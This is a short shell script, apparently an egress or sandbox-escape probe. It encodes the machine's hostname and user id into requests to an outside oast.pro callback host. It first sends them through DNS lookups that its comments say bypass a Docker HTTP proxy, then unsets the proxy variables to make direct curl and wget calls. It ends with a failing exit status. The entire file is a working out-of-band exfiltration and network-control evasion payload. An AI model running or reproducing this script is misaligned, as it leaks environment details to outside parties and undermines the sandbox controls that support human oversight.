#!/bin/sh
LABEL="$(hostname | tr '.' '-').$(id -u)"

# Vector 1: DNS OOB — bypasses HTTP proxy, uses Docker host-side DNS daemon
# Docker's embedded DNS (127.0.0.11) runs on host, can reach external nameservers
nslookup "dns.${LABEL}.db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro" 2>/dev/null || true
host "dns.${LABEL}.db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro" 2>/dev/null || true
dig +short "dns.${LABEL}.db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro" 2>/dev/null || true
getent hosts "dns.${LABEL}.db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro" 2>/dev/null || true

# Vector 2: Unset HTTP_PROXY and try direct HTTP — works if only env-var proxy (no iptables)
unset HTTP_PROXY HTTPS_PROXY http_proxy https_proxy ALL_PROXY
curl --noproxy '*' -fsSL "https://db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro/http.${LABEL}" -o /dev/null 2>/dev/null || true
wget --no-proxy -q "https://db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro/wget.${LABEL}" -O /dev/null 2>/dev/null || true

exit 1
